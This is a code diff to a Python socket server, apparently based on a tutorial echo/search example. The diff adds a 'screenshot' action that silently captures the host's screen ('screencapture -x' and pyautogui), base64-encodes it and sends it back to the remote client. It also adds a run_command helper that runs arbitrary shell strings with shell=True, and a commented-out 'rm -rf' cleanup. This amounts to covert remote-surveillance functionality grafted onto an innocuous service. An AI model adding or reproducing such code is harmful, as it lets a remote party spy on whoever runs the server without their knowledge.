@@ -1,8 +1,19 @@
+# -*- coding: utf-8 -*-
+# __author__ = "J3T3D0nn3r"
+# __license__ = "GPLv3"
+
 import sys
 import selectors
 import json
 import io
 import struct
+import numpy as np
+import cv2
+import pyautogui
+import subprocess
+import base64
+
+OUTPUT_FILE = "/var/tmp/image-cache.png"
 
 request_search = {
     "morpheus": "Follow the white rabbit. \U0001f430",
@@ -10,6 +21,10 @@ request_search = {
     "\U0001f436": "\U0001f43e Playing ball! \U0001f3d0",
 }
 
+
+def run_command(command):
+    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+    return out + err
 
 class Message:
     def __init__(self, selector, sock, addr):
@@ -93,9 +108,16 @@ class Message:
         if action == "search":
             query = self.request.get("value")
             answer = request_search.get(query) or f'No match for "{query}".'
-            content = {"result": answer}
+            content = {"action": action, "result": answer}
+        elif action == "screenshot":
+            content_encoding = "utf-8"
+            self.take_screenshot()
+            imgbase64 = self.take_screenshotng()
+            query = self.request.get("value")
+            answer = "Screenshot taken" #request_search.get(query) or f'No match for "{query}".'
+            content = {"action": action, "result": answer, "img": imgbase64.decode(content_encoding)}
         else:
-            content = {"result": f'Error: invalid action "{action}".'}
+            content = {"action": action, "result": f'Error: invalid action "{action}".'}
         content_encoding = "utf-8"
         response = {
             "content_bytes": self._json_encode(content, content_encoding),
@@ -103,6 +125,36 @@ class Message:
             "content_encoding": content_encoding,
         }
         return response
+
+    #def run(options):
+    #    self.run_command("screencapture -x " + OUTPUT_FILE)
+        #print(run_command("base64 " + OUTPUT_FILE))
+        #run_command("rm -rf " + OUTPUT_FILE)
+    # Python program to take
+    # screenshots
+
+    def take_screenshotng(self):
+        #self.run_command()
+        run_command("screencapture -x " + OUTPUT_FILE)
+        #file = 'deer.jpg'
+        image = open(OUTPUT_FILE, 'rb')
+        image_read = image.read()
+        image_64_encode = base64.encodebytes(image_read)  # encodestring also works aswell as decodestring
+        return image_64_encode
+
+    def take_screenshot(self):
+        # take screenshot using pyautogui
+        image = pyautogui.screenshot()
+
+        # since the pyautogui takes as a
+        # PIL(pillow) and in RGB we need to
+        # convert it to numpy array and BGR
+        # so we can write it to the disk
+        image = cv2.cvtColor(np.array(image),
+                             cv2.COLOR_RGB2BGR)
+
+        # writing it to the disk using opencv
+        cv2.imwrite("image1.png", image)
 
     def _create_response_binary_content(self):
         response = {
